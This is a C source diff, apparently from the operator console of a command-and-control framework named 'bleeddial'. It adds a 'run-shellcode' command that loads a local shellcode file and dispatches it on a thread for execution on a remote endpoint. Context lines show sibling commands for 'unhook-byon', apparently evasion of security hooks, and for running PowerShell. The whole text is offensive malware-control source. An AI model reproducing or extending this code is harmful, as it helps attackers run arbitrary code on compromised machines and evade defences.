@@ -453,6 +453,38 @@ int _handle_unhook_byon(char* user_input,
 	return 0;
 }
 
+int _handle_run_shellcode(char* user_input,
+	char** tok_ctx_ptr,
+	struct cli_info_t* cli_info,
+	struct bleeddial_ctx_t* ctx) {
+
+	char from_to_tuple[2][255];
+
+	int res = _from_to_paths(*tok_ctx_ptr, from_to_tuple);
+	if (res == -2) {
+		printf("No file specified!\n");
+		return 0;
+	}
+
+	struct runcode_params_t* params;
+	params = calloc(1, sizeof(*params));
+	if (params == 0) return -1;
+
+	params->ctx = ctx;
+	params->endpoint_id = cli_info->endpoint_id;
+
+	strncpy_s(params->local_path,
+		255,
+		from_to_tuple[PATH_FROM],
+		_TRUNCATE
+	);
+	params->local_path_len = strlen(from_to_tuple[PATH_FROM]);
+
+	CreateThread(NULL, 0, thread_runcode, params, 0, 0);
+
+	return 0;
+}
+
 int _handle_user_input(char* user_input, 
 					   size_t user_input_len, 
 					   struct cli_info_t* cli_info,
@@ -502,6 +534,9 @@ int _handle_user_input(char* user_input,
 		}
 		if (strncmp(first_word, "unhook-byon", 11) == 0) {
 			return _handle_unhook_byon(user_input, &tok_ctx, cli_info, ctx);
+		}
+		if (strncmp(first_word, "run-shellcode", 11) == 0) {
+			return _handle_run_shellcode(user_input, &tok_ctx, cli_info, ctx);
 		}
 		if (strncmp(first_word, "powershell", 10) == 0) {
 			struct powershell_params_t* p = calloc(1, sizeof(*p));
